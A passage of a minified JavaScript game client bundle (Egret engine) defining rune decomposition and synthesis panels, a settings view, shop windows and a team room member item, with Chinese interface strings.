s=o[n];if(s&&s.isSelected&&s.itemData&&s.itemData.itemConfig){var a=r.RuneConfigMgr.ins().getBaseCfg(s.itemData);if(a){t+=a.gain;var l=d.GlobalConfig.RuneBaseConfig[a.id-a.id%1e3+1];(null===l||void 0===l?void 0:l.chip)&&(e+=l.chip),l&&(i+=l.goldCount||0)}}}var h=u.ActorCC.runeExchange,c=u.ActorCC.runeShatter,f=p.BagCT.ins().getBagGoodsCountById(p.BagCT.BAG_TYPE_OTHTER,d.GlobalConfig.RuneOtherConfig.goldItemId);this.lab0=(new egret.HtmlTextParser).parse(h+" "+(e?"+"+e:"")),this.lab1=(new egret.HtmlTextParser).parse(""+c),this.lab1_2=(new egret.HtmlTextParser).parse(""+(t?"+"+t:"")),this.lab2=(new egret.HtmlTextParser).parse(""+f),this.lab2_2=(new egret.HtmlTextParser).parse(""+(i?"+"+i:""))},e.prototype.setQualitySelected=function(t,e){for(var i=0,n=this.cardList;i<n.length;i++){var o=n[i];l.ItemUtil.getQuality2(o.itemData.itemConfig)==t&&(o.isSelected=e)}for(var s=this.cardCollection.length,a=0;s>a;a++)this.cardCollection.itemUpdated(this.cardList[a])},e.prototype.resetCheckBox=function(t){void 0===t&&(t=1);for(var e in this.cbArr)this.cbArr[e].selected=+e+1==t;this.setQualitySelected(t,!0)},e.prototype.initCardList=function(){this.cardList=[];var t=p.BagCT.ins().getBagGoodsByType(6);if(t&&t.length>0){for(var e=0,i=t;e<i.length;e++)for(var n=i[e],s=0;s<n.count;s++){var a=new o.RuneDecomposeItemData;a.itemData=n,this.cardList.push(a)}this.cardList.sort(this.sortList)}this.cardCollection?this.cardCollection.replaceAll(this.cardList):this.cardCollection=new eui.ArrayCollection(this.cardList),this.eList.dataProvider=this.cardCollection},e.prototype.sortList=function(t,e){var i=l.ItemUtil.getQuality2(t.itemData.itemConfig),n=l.ItemUtil.getQuality2(e.itemData.itemConfig);if(i>n)return-1;if(n>i)return 1;var o=r.RuneConfigMgr.ins().getBaseCfg(t.itemData),s=r.RuneConfigMgr.ins().getBaseCfg(e.itemData);if(o&&s){var a=o.id%100,h=s.id%100;if(a>h)return-1;if(h>a)return 1}return t.itemData.configID-e.itemData.configID},e}(n.BaseView);e.RuneDecomposePanel=f,window.RuneDecomposePanel=f,__reflect(f.prototype,"RuneDecomposePanel",[]),window.RuneDecomposePanel=f},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RuneReplaceItemData=e.RuneReplaceItemRenderer=void 0;var n=i(0),o=i(10),s=i(108),a=i(3),r=i(22),l=i(72),h=i(503),u=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.isCur=!1,e.icon="",e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this.getBtn,function(){win.open("FBChallengePanel")}),this.addTouchEvent(this.changeBtn,this.sendEquip)},e.prototype.sendEquip=function(){var t=this.data;send(Ts.equipRune,{role:t.roleID,pos:t.pos,runeId:t.data.handle}),win.close(h.RuneReplaceWin)},e.prototype.dataChanged=function(){var t=this.data,e=t.data,i=t.canEquip,a=(e.handle,e.itemConfig);if(this.isCur?this.currentState=a?"now":"dis":this.currentState=a?i?"all":"noequip":"get",this.icon=o.ItemUtil.getItemSource(a),a){var h=n.GlobalConfig.RuneNameConfig[o.ItemUtil.getSubType(a)];this.desc=HtmlUtil.parse(HtmlUtil.fontColor(h.runeName+"Lv."+a.id%100+"\n\n"+r.AttributeData.getAttStr1(s.RuneConfigMgr.ins().getAttr(e),l.AttributeFormat.FORMAT_0()),"0x"+o.ItemUtil.getQualityColor(o.ItemUtil.getQuality2(a)).toString(16)))}},e.prototype.getItemId=function(){return this.data&&this.data.data?this.data.data.configID:0},e}(a.BaseItemRender);e.RuneReplaceItemRenderer=u,window.RuneReplaceItemRenderer=u,__reflect(u.prototype,"RuneReplaceItemRenderer",[]);var p=function(){function t(t){this.data=t}return t}();e.RuneReplaceItemData=p,window.RuneReplaceItemData=p,__reflect(p.prototype,"RuneReplaceItemData",[]),window.RuneReplaceItemRenderer=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RuneSynthesisPanel=void 0;var n=i(21),o=i(8),s=i(19),a=i(5),r=i(1),l=i(22),h=i(72),u=i(0),p=i(15),d=i(40),c=i(12),f=i(7),g=i(2),m=i(27),v=i(127),y=i(108),C=i(501),T=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="RuneSynthesisSkin",e.itemId0=0,e.itemId1=0,e.itemId2=0,e.btnTime=3*o.DateUtils.MS_PER_SECOND,e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this.btnCompose,this.onTap),this.addTouchEvent(this.rune0,this.onTap),this.addTouchEvent(this.rune1,this.onTap),this.addTouchEvent(this.rune2,this.onTap),this.addTouchEvent(this.closeBtn,this.onTap),this.addTouchEvent(this.grpHelp,this.onTap),this.baojiMc=new n.MovieClip,this.grpEff.addChild(this.baojiMc)},e.prototype.addDisplay=function(){observe(this,this.synthesisSelect,v.RuneCC.synthesisSelect),observe(this,this.postRuneCompose,v.RuneCC.postRuneCompose),observe(this,this.postRuneMinNum,v.RuneCC.postRuneMinNum),this.lbSuccessRate.text="0%",this.eCurAttr.textFlow=a.TextFlowMaker.generateTextFlow1(""),this.eNextAttr.textFlow=a.TextFlowMaker.generateTextFlow1(""),this.rune0.clearData(),this.rune1.clearData(),this.rune2.clearData(),this.pb3.width=this.pb2.width=this.pb1.width=92,this.pb3.height=this.pb2.height=this.pb1.height=20,this.pb3._direction=this.pb2._direction=this.pb1._direction="ltr",this.pb1.value=0,this.pb2.value=0,this.pb3.value=0,this.runeCenter.clearData(!0),this.eCur.clearData(!0),this.Grpcount.visible=!1,this.postRuneMinNum(),this.bottom=this.top=0},e.prototype.composeBtnState=function(){this.btnCompose.visible=!1,this.btnTime=f.GameServerCC.serverTime+this.btnTime;var t=this.btnTime-f.GameServerCC.serverTime;t&&Timer.start(1e3,0,this.updateTime,this)},e.prototype.updateTime=function(){console.log("时差=="+(this.btnTime-f.GameServerCC.serverTime));var t=this.btnTime-f.GameServerCC.serverTime;return 0>=t?(this.btnTime=3*o.DateUtils.MS_PER_SECOND,this.btnCompose.visible=!0,void Timer.stop(this.updateTime,this)):void 0},e.prototype.synthesisSelect=function(t){var e=u.GlobalConfig.RuneComposeConfig;if(1==t.length){this.rune0.setPos(t[0].itemData),this.itemId0=t[0].itemData.configID;var i=this.getCfgId(this.itemId0),n=new d.ItemData;n.configID=i,this.runeCenter.setPos(n),v.RuneCC.sendRuneMinNum(n.configID),this.eCur.setPos(n),this.lbSuccessRate.text=e[i].rate/100+"%",this.lbCost.text=e[i].cost[0].count+"",this.eCurAttr.textFlow=a.TextFlowMaker.generateTextFlow1(l.AttributeData.getAttStr1(y.RuneConfigMgr.ins().getAttr(t[0].itemData),h.AttributeFormat.FORMAT_0())),this.eNextAttr.textFlow=a.TextFlowMaker.generateTextFlow1(l.AttributeData.getAttStr1(y.RuneConfigMgr.ins().getAttr(n),h.AttributeFormat.FORMAT_0())),v.RuneCC.mainComposeEquip=t[0].itemData,v.RuneCC.centerComposeEquip=n,v.RuneCC.resultItem1=n,v.RuneCC.resultItem2=t[0].itemData;var o=v.RuneCC.assistantComposeEquip&&v.RuneCC.assistantComposeEquip.length>0?!0:!1;o&&this.getCfgId(v.RuneCC.assistantComposeEquip[0].configID)!=this.getCfgId(t[0].itemData.configID)&&(v.RuneCC.assistantComposeEquip=[],this.rune1.clearData(),this.rune2.clearData())}else this.rune1.setPos(t[0].itemData),this.rune2.setPos(t[1].itemData),this.itemId1=t[0].itemData.configID,this.itemId2=t[1].itemData.configID,v.RuneCC.assistantComposeEquip=[t[0].itemData,t[1].itemData]},e.prototype.getCfgId=function(t){return 1e3*Math.floor(t/1e3)+1e4+1},e.prototype.postRuneCompose=function(t){this.openComposeResultWin(t),this.grpEff.addChild(this.baojiMc),this.baojiMc.playFile(RES_DIR_EFF+"hecheng",1)},e.prototype.openComposeResultWin=function(t){t?win.open(C.RuneComposeResultWin,t,v.RuneCC.resultItem1):win.open(C.RuneComposeResultWin,t,v.RuneCC.resultItem2),this.Grpcount.visible=!1,this.pb1.value=0,this.pb2.value=0,this.pb3.value=0,this.clearThisData()},e.prototype.postRuneMinNum=function(){if(!this.runeCenter.data)return void(this.Grpcount.visible=!1);this.Grpcount.visible=!0;var t=u.GlobalConfig.RuneComposeConfig,e=this.runeCenter.data.configID,i=t[e].floor;this.lbcount.text=i-v.RuneCC.runeMinNum+""},e.prototype.clearThisData=function(){this.rune0.clearData(),this.rune1.clearData(),this.rune2.clearData(),this.eCur.clearData(!0),this.runeCenter.clearData(!0),v.RuneCC.mainComposeEquip=null,v.RuneCC.assistantComposeEquip=[],v.RuneCC.centerComposeEquip=null,this.lbSuccessRate.text="0%",this.lbCost.text="0",this.eCurAttr.textFlow=a.TextFlowMaker.generateTextFlow1(""),this.eNextAttr.textFlow=a.TextFlowMaker.generateTextFlow1("")},e.prototype.removeDisplay=function(){this.skin&&(egret.Tween.removeTweens(this.pb1),egret.Tween.removeTweens(this.pb2),egret.Tween.removeTweens(this.pb3),Timer.stop(this.updateTime,this),this.clearThisData())},e.prototype.onTap=function(t){var e=this;if(t&&t.currentTarget)switch(t.currentTarget){case this.closeBtn:win.close(this);break;case this.grpHelp:var i=u.GlobalConfig.HelpInfoConfig[315];win.open("CommonHelpWin",(null===i||void 0===i?void 0:i.text)||"");break;case this.btnCompose:if(!this.runeCenter.data||!this.rune1.data||!this.rune2.data)return void g.TipsCT.ins().showTips(gettext("请选择素材"));var n=u.GlobalConfig.RuneComposeConfig,o=this.getCfgId(this.itemId0),a=n[o].cost[0].id,r=n[o].cost[0].count,l=s.GlobalFun.checkCost(r,a);if(!l)return;var h=this.itemId0%100,p=this.itemId1%100,d=this.itemId2%100;if(h>1||p>1||d>1)return void m.WarnWin.show(gettext("您选择的素材中包含已强化战纹，是否继续合成"),function(){e.sendRuneMerge()},this);this.sendRuneMerge();break;case this.rune0:win.open("RuneSynthesisSelectPanel",0);break;case this.rune1:if(!v.RuneCC.mainComposeEquip)return void g.TipsCT.ins().showTips(gettext("请先选择主战纹"));win.open("RuneSynthesisSelectPanel",1);break;case this.rune2:if(!v.RuneCC.mainComposeEquip)return void g.TipsCT.ins().showTips(gettext("请先选择主战纹"));win.open("RuneSynthesisSelectPanel",2)}},e.prototype.sendRuneMerge=function(){this.composeBtnState(),egret.Tween.removeTweens(this.pb1),egret.Tween.removeTweens(this.pb2),egret.Tween.removeTweens(this.pb3),this.pb1.maximum=this.pb2.maximum=this.pb3.maximum=100,this.pb1.value=this.pb2.value=this.pb3.value=0;var t=egret.Tween.get(this.pb1),e=egret.Tween.get(this.pb2),i=egret.Tween.get(this.pb3);t.to({value:this.pb1.maximum},500).wait(100).call(function(){v.RuneCC.sendRuneMerge()},this),e.to({value:this.pb2.maximum},500).wait(100).call(function(){},this),i.to({value:this.pb3.maximum},500).wait(100).call(function(){},this)},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=c.OpenSystem.ins().checkSysOpen(p.SystemType.RUNE_SYNTHESIS);return i||g.TipsCT.ins().showTips(c.OpenSystem.ins().getNoOpenTips(p.SystemType.RUNE_SYNTHESIS)),i},__decorate([delayCall(1e3)],e.prototype,"openComposeResultWin",null),e}(r.BaseView);e.RuneSynthesisPanel=T,window.RuneSynthesisPanel=T,__reflect(T.prototype,"RuneSynthesisPanel",[]),window.RuneSynthesisPanel=T},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RuneSynthesisSelectPanel=void 0;var n=i(1),o=i(502),s=i(2),a=i(108),r=i(10),l=i(6),h=i(127),u=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="RuneSynthesisSelectSkin",e.cardCollection=null,e._addNum=0,e._chipNum=0,e.typeMain=0,e
}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.typeMain=t[0],this.addTouchEvent(this.eBtn,this.onTap),this.addEvent(eui.ItemTapEvent.ITEM_TAP,this.eList,this.onListTap),this.initCardList(this.typeMain),this.setQualitySelected(),0==this.typeMain?this.grSelectNumber.visible=!1:this.grSelectNumber.visible=!0},e.prototype.onListTap=function(t){if(0==this.typeMain)var e=1;else e=2;var i=this.eList.selectedItem;if(i.isSelected=!i.isSelected,this.cardCollection.itemUpdated(i),this.eList.selectedIndex=-1,i.isSelected)this.seleList.length>=e&&(this.seleList[0].isSelected=!1,this.cardCollection.itemUpdated(this.seleList[0]),this.seleList.shift()),i!=this.seleList[0]&&this.seleList.push(i);else for(var n=0;n<this.seleList.length;n++)this.seleList[n]==i&&this.seleList.splice(n,1);this.lbSelectedCount.text=this.seleList.length+"/2"},e.prototype.onTap=function(t){if(t&&t.currentTarget)switch(t.currentTarget){case this.eBtn:this.decomposeRune()}},e.prototype.getCfgId=function(t){return 1e3*Math.floor(t/1e3)+1e4+1},e.prototype.decomposeRune=function(){if(!this.seleList||!this.seleList.length)return void s.TipsCT.ins().showTips(gettext("当前无选择任何战纹"));if(0==this.typeMain){if(this.seleList.length>1)return void s.TipsCT.ins().showTips(gettext("主战纹只能选择1个"))}else if(2!=this.seleList.length)return void s.TipsCT.ins().showTips(gettext("副战纹必须选择2个"));h.RuneCC.synthesisSelect(this.seleList),win.close(this)},e.prototype.setQualitySelected=function(){for(var t=0,e=this.cardList;t<e.length;t++){var i=e[t];4==r.ItemUtil.getQuality2(i.itemData.itemConfig)&&(i.isSelected=!1)}for(var n=this.cardCollection.length,o=0;n>o;o++)this.cardCollection.itemUpdated(this.cardList[o]);this.seleList=[]},e.prototype.initCardList=function(t){this.cardList=[];var e=l.BagCT.ins().getBagGoodsByType(6);if(e&&e.length>0){for(var i=0,n=e;i<n.length;i++){var s=n[i],a=s.count;if(0==t)for(var u=0;u<h.RuneCC.assistantComposeEquip.length;u++)h.RuneCC.assistantComposeEquip[u].configID==s.configID&&a--;else{if(h.RuneCC.mainComposeEquip&&this.getCfgId(h.RuneCC.mainComposeEquip.configID)!=this.getCfgId(s.configID))continue;h.RuneCC.mainComposeEquip&&h.RuneCC.mainComposeEquip.configID==s.configID&&a--}a=0>a?0:a;for(var u=0;a>u;u++){var p=new o.RuneDecomposeItemData;p.itemData=s,4==r.ItemUtil.getQuality2(p.itemData.itemConfig)&&this.cardList.push(p)}}this.cardList.sort(this.sortList)}this.cardCollection?this.cardCollection.replaceAll(this.cardList):this.cardCollection=new eui.ArrayCollection(this.cardList),this.eList.dataProvider=this.cardCollection},e.prototype.sortList=function(t,e){var i=r.ItemUtil.getQuality2(t.itemData.itemConfig),n=r.ItemUtil.getQuality2(e.itemData.itemConfig);if(i>n)return-1;if(n>i)return 1;var o=a.RuneConfigMgr.ins().getBaseCfg(t.itemData),s=a.RuneConfigMgr.ins().getBaseCfg(e.itemData);if(o&&s){var l=o.id%100,h=s.id%100;if(l>h)return-1;if(h>l)return 1}return t.itemData.configID-e.itemData.configID},e}(n.BaseView);e.RuneSynthesisSelectPanel=u,window.RuneSynthesisSelectPanel=u,__reflect(u.prototype,"RuneSynthesisSelectPanel",[]),window.RuneSynthesisSelectPanel=u},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.SettingView=void 0;var n=i(1),o=i(112),s=i(2),a=i(0),r=i(6),l=i(195),h=i(57),u=i(8),p=i(7),d=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="settingskin",e.defaultRect=!1,e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this.cbSound,this.onTouch),this.addTouchEvent(this.hideFightingEff,this.onTouch),this.addTouchEvent(this.hideFightingWord,this.onTouch),this.addTouchEvent(this.fps1,this.onTouch),this.addTouchEvent(this.fps2,this.onTouch),this.addTouchEvent(this.logout,this.onTouch),this.addTouchEvent(this.changeActorBtn,this.onTouch),this.addTouchEvent(this.cbBarrage,this.onTouch),this.addTouchEvent(this.closeBtn,this.onTouch),this.addTouchEvent(this.cbHp,this.onTouch),this.addTouchEvent(this.cbMp,this.onTouch),this.addTouchEvent(this.cbSp,this.onTouch),this.addTouchEvent(this.HpSubBtn,this.onTouch),this.addTouchEvent(this.MpSubBtn,this.onTouch),this.addTouchEvent(this.SpSubBtn,this.onTouch),this.addTouchEvent(this.HpAddBtn,this.onTouch),this.addTouchEvent(this.MpAddBtn,this.onTouch),this.addTouchEvent(this.SpAddBtn,this.onTouch),this.addTouchEvent(this.HpGoBtn,this.onTouch),this.addTouchEvent(this.MpGoBtn,this.onTouch),this.addTouchEvent(this.SpGoBtn,this.onTouch),this.addTouchEvent(this.lb_title,this.onTouch),this.addTouchEvent(this.fight0,this.onTouch),this.addTouchEvent(this.hideWing,this.onTouch),this.addTouchEvent(this.hideKillDrop,this.onTouch),Timer.start(1e3,0,this.updateTime,this),this.updateTime()},e.prototype.addDisplay=function(){observe(this,this.updateItemLab,o.SysSetting.ins().setRecoverItem),this.cbSound.selected=o.SysSetting.ins().getBool(o.SysSetting.SOUND_EFFECT),this.setFrameRateValue(o.SysSetting.ins().getValue(o.SysSetting.GAME_FRAME_RATE)),this.hideFightingEff.selected=o.SysSetting.ins().getBool(o.SysSetting.FIGTHING_EFF),this.hideFightingWord.selected=o.SysSetting.ins().getBool(o.SysSetting.BLOOD_EFF),this.fight0.selected=o.SysSetting.ins().getBool(o.SysSetting.AUTO_SEL_HIGH_QUALITY_MON),this.cbBarrage.selected=o.SysSetting.ins().getBool(o.SysSetting.BARRAGE),this.cbHp.selected=o.SysSetting.ins().getBool(o.SysSetting.HP),this.cbMp.selected=o.SysSetting.ins().getBool(o.SysSetting.MP),this.cbSp.selected=o.SysSetting.ins().getBool(o.SysSetting.SP),this.hideWing.selected=o.SysSetting.ins().getBool(o.SysSetting.WING_EFF),this.hideKillDrop.selected=o.SysSetting.ins().getBool(o.SysSetting.HIDE_NOTICE_KILL_DROP),this.HP_NUMLabel.text=o.SysSetting.ins().getValue(o.SysSetting.HP_NUM)+"%",this.MP_NUMLabel.text=o.SysSetting.ins().getValue(o.SysSetting.MP_NUM)+"%",this.SP_NUMLabel.text=o.SysSetting.ins().getValue(o.SysSetting.SP_NUM)+"%",this.setFrameRateValue(o.SysSetting.ins().getValue(o.SysSetting.GAME_FRAME_RATE)),this.lab2.visible=!window.platform.isshen(),this.updateItemLab(),this.setBag(),this.logout.visible=urlParam.isShowExitBtn,this.changeActorBtn.visible=urlParam.isShowChangeActorBtn,platform.logoutLable&&(this.logout.label=platform.logoutLable())},e.prototype.updateTime=function(){this.lb_sysTime.text=gettext("当前时间：{0}",u.DateUtils.formatFullTime(p.GameServerCC.serverTime))},e.prototype.updateItemLab=function(){var t=o.SysSetting.ins().getValue(o.SysSetting.HP_ITEM),e=a.GlobalConfig.ItemConfig[t];this.HpLab.text=e.name+":"+r.BagCT.ins().getBagGoodsCountById(r.BagCT.BAG_TYPE_OTHTER,t);var i=o.SysSetting.ins().getValue(o.SysSetting.MP_ITEM),n=a.GlobalConfig.ItemConfig[i];this.MpLab.text=n.name+":"+r.BagCT.ins().getBagGoodsCountById(r.BagCT.BAG_TYPE_OTHTER,i);var s=o.SysSetting.ins().getValue(o.SysSetting.SP_ITEM),l=a.GlobalConfig.ItemConfig[s];this.SpLab.text=l.name+":"+r.BagCT.ins().getBagGoodsCountById(r.BagCT.BAG_TYPE_OTHTER,s)},e.prototype.setBag=function(){this.cb7Num.text=String(o.SysSetting.ins().getValue(o.SysSetting.BAG_NUM7));for(var t=r.BagCT.ins().settingBag,e=0;e<t.length;e++)this["cb"+e].selected=t[e].value>0;this.cb7Num.text=""+(t[7].value||0)},e.prototype.keepSetBag=function(){o.SysSetting.ins().setValue(o.SysSetting.BAG_NUM7,Number(this.cb7Num.text)||0);for(var t=0;t<r.BagCT.ins().settingBag.length;t++)r.BagCT.ins().settingBag[t].value=this["cb"+t].selected?1:0;this.cb7.selected&&(r.BagCT.ins().settingBag[h.SettingBagType.RecycleLessLevelEquip].value=Number(this.cb7Num.text)||0),r.BagCT.ins().sendSetBag()},e.prototype.setFrameRateValue=function(t){38==t||void 0==t?(this.fps1.selected=!0,this.fps2.selected=!1):(this.fps1.selected=!1,this.fps2.selected=!0),o.SysSetting.ins().setValue(o.SysSetting.GAME_FRAME_RATE,t)},e.prototype.onTouch=function(t){switch(t.currentTarget){case this.cbSound:o.SysSetting.ins().setBool(o.SysSetting.SOUND_EFFECT,t.currentTarget.selected),s.TipsCT.ins().showTips("");break;case this.hideFightingEff:o.SysSetting.ins().setBool(o.SysSetting.FIGTHING_EFF,t.currentTarget.selected);break;case this.fight0:o.SysSetting.ins().setBool(o.SysSetting.AUTO_SEL_HIGH_QUALITY_MON,t.currentTarget.selected);break;case this.hideFightingWord:o.SysSetting.ins().setBool(o.SysSetting.BLOOD_EFF,t.currentTarget.selected);break;case this.fps1:this.setFrameRateValue(38);break;case this.fps2:this.setFrameRateValue(90);break;case this.cbBarrage:o.SysSetting.ins().setBool(o.SysSetting.BARRAGE,t.currentTarget.selected);break;case this.closeBtn:this.keepSetBag(),win.close(this);break;case this.cbHp:case this.cbMp:case this.cbSp:o.SysSetting.ins().setBool(o.SysSetting[t.target.name],t.currentTarget.selected);break;case this.HpGoBtn:case this.MpGoBtn:case this.SpGoBtn:win.open("MainPotTip",t.target.name);break;case this.logout:platform.exit();break;case this.changeActorBtn:platform.changeActor();break;case this.HpSubBtn:case this.MpSubBtn:case this.SpSubBtn:var e=o.SysSetting.ins().getValue(o.SysSetting[t.target.name])||l.MainPotCC.Dv;if(e<=l.MainPotCC.Min)return;o.SysSetting.ins().setValue(o.SysSetting[t.target.name],e-l.MainPotCC.OFF),this[t.target.name+"Label"]&&(this[t.target.name+"Label"].text=o.SysSetting.ins().getValue(o.SysSetting[t.target.name])+"%");break;case this.HpAddBtn:case this.MpAddBtn:case this.SpAddBtn:var i=o.SysSetting.ins().getValue(o.SysSetting[t.target.name])||l.MainPotCC.Dv;if(i>=l.MainPotCC.Max)return;o.SysSetting.ins().setValue(o.SysSetting[t.target.name],i+l.MainPotCC.OFF),this[t.target.name+"Label"]&&(this[t.target.name+"Label"].text=o.SysSetting.ins().getValue(o.SysSetting[t.target.name])+"%");break;case this.lb_title:this.lb_ver.text="ev="+urlParam.ev+" gv="+urlParam.gv;break;case this.hideWing:o.SysSetting.ins().setBool(o.SysSetting.WING_EFF,t.currentTarget.selected);break;case this.hideKillDrop:o.SysSetting.ins().setBool(o.SysSetting.HIDE_NOTICE_KILL_DROP,t.currentTarget.selected)}},e.prototype.removeDisplay=function(){Timer.stop(this.updateTime,this)},e}(n.BaseView);e.SettingView=d,window.SettingView=d,__reflect(d.prototype,"SettingView",[]),window.SettingView=d},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ShopMianCityTip=void 0;var n=i(1),o=i(167),s=i(228),a=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="ShopMianCityTipSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.list.itemRenderer=s.BagCallBackItem,this.list.dataProvider=this.listArr=new eui.ArrayCollection([])},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.listArr.replaceAll([...[{id: 28,group: 4,type: 1,itemid: [100024]},{id: 29,group: 4,type: 1,itemid: [100025]},{id: 30,group: 4,type: 1,itemid: [100014]},{id: 31,group: 4,type: 1,itemid: [100015]}],...o.SmeltCC.GetCbList(4)]||[])},e}(n.BaseView);e.ShopMianCityTip=a,window.ShopMianCityTip=a,__reflect(a.prototype,"ShopMianCityTip",[]),window.ShopMianCityTip=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ShopWin=void 0;var n=i(317),o=i(130),s=i(6),a=i(505),r=i(52),l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.oneLevelWin=!0,e._sn_="ShopSkin",e.evsIdx=0,e.isAcution=!1,e}return __extends(e,t),e.prototype.skinComplete=function(){this.baseTab=this.eTab,this.baseViewStack=this.eVs},e.prototype.addDisplay=function(){for(var t,e=[],i=0;i<arguments.length;i++)e[i]=arguments[i];this.param=e;var n=e[0];if(isNaN(n))if(this[n])n=Math.max(this.eVs.getItemIndex(null===(t=this[n])||void 0===t?void 0:t.name),0);else for(var a=0;a<this.eVs.numElements;a++){var l=this.eVs.getElementAt(a);if(l.__class__==e[0]){n=a;break}}this.evsIdx=n,this.eVs.selectedIndex=this.eTab.selectedIndex=n,this.addChangeEvent(this.eTab,this.onTabTouch),observe(this,this.buyToUse,s.BagCT.ins().postItemAdd),observe(this,this.UpdteAuctionWinRP,o.Auction.ins().postListData),observe(this,this.UpdteAuctionWinRP,o.Auction.ins().postAuctionResult),observe(this,this.UpdteAuctionWinRP,o.Auction.ins().postUpdate),r.Shop.ins().postRefreshGoodsSuccess(!1),this.initTab(),this.openChildTab()},e.prototype.openChildTab=function(){var t=this.eVs.getElementAt(this.evsIdx);t&&this.param&&this.param[1]&&t instanceof a.WeekMarketMainPanel&&(t.openIdx=this.param[1])},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return!(null===urlParam||void 0===urlParam?void 0:urlParam.isHideAllShop)},e.prototype.initTab=function(){var t=this.eVs.getElementAt(this.evsIdx),e=this.eVs.getChildIndex(this.weekLoopMarketPanel);e>=0&&window.platform.isshen()&&this.eVs.removeChildAt(e),e=this.eVs.getChildIndex(this.weekMarketPanel3),e>=0&&window.platform.isshen()&&this.eVs.removeChildAt(e),e=this.eVs.getChildIndex(this.shopDailyGiftPanel),e>=0&&window.platform.isshen()&&this.eVs.removeChildAt(e),e=this.eVs.getChildIndex(this.AuctionWin),e>=0&&window.platform.isshen()&&this.eVs.removeChildAt(e),this.evsIdx=this.eVs.getChildIndex(t),this.evsIdx=Math.max(this.evsIdx,0),this.eTab.selectedIndex=this.evsIdx,this.eVs.selectedIndex=this.evsIdx,this.eTab.validateNow();var i=this.eTab.getElementAt(this.evsIdx),n=this.eVs.getElementAt(this.evsIdx);i&&n&&(i.bg.source=n.tabImg+"1",this.UpdteAuctionWinRP())},e.prototype.UpdteAuctionWinRP=function(){if(!(this.eTab.numChildren<7)){var t=this.eTab.getChildAt(6);t.eRp.visible=!0;var e=o.Auction.ins().RPNumber;1==e?t.eRp.visible=!0:t.eRp.visible=!1}},e.prototype.onTabTouch=function(){if(this.evsIdx!=this.eTab.selectedIndex){var t=this.eTab.getElementAt(this.evsIdx),e=this.eVs.getElementAt(this.evsIdx);if(t&&e){t.bg.source=e.tabImg;var i=this.eTab.getElementAt(this.eTab.selectedIndex),n=this.eVs.getElementAt(this.eTab.selectedIndex);i&&n&&(i.bg.source=n.tabImg+"1",this.evsIdx=this.eTab.selectedIndex)}}},e.prototype.buyToUse=function(){r.Shop.ins().shopBuyArr||(r.Shop.ins().shopBuyArr=[]);for(var t=0;t<r.Shop.ins().shopBuyArr.length;t++){var e=r.Shop.ins().shopBuyArr[t];s.BagCT.ins().sendUseItem(e.id,e.count)}},e.prototype.changeView=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=0;if(this.param=t,isNaN(t[0])){if("string"==typeof t[0])for(var n=0;n<this.eVs.numElements;n++){var o=this.eVs.getElementAt(n);if(o.__class__==t[0]){i=n;break}}}else i=t[0];this.baseTab&&(this.baseTab.selectedIndex=i,this.baseViewStack&&(this.baseViewStack.selectedIndex=i))},e}(n.BaseDuoPanelWin);e.ShopWin=l,window.ShopWin=l,__reflect(l.prototype,"ShopWin",[]),window.ShopWin=l},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.StardomainRoomMemberItem=void 0;var n=i(3),o=i(2),s=i(0),a=i(10),r=i(4),l=i(83),h=i(507),u=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="teamFbRoleItem",e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this.invite,this.onTouch),this.addTouchEvent(this.nomember,this.onTouch),this.addTouchEvent(this.rolegroup,this.onTouch)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.dataChanged(),this.grpPower.visible=!0},e.prototype.onTouch=function(t){switch(t.target){case this.invite:case this.nomember:var e=l.StardomainCT.ins().checkMeIsLeader();if(!e)return void o.TipsCT.ins().showTips(gettext("队长才能邀请玩家"));l.StardomainCT.ins().postOpenInviteView();break;case 